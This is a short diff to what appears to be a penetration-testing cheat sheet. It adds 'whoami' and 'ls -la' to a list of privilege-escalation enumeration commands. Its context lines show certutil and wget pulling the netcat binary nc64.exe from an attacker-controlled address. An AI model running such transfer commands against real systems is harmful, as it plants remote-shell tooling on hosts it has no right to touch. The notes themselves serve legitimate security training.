@@ -58,9 +58,11 @@ certutil -urlcache -f http://10.10.14.154:8888/nc64.exe nc64.exe #(windows)
 wget http://ipaddress:portnumber/filename #(for both linux and windows)
 ```
 
-Privilege Escalation Commands:
+Privilege Escalation common Commands:
 ---------------------------------------------------------------------------
 ```
+whoami
+ls -la
 uname -a
 cat /proc/version
 id 
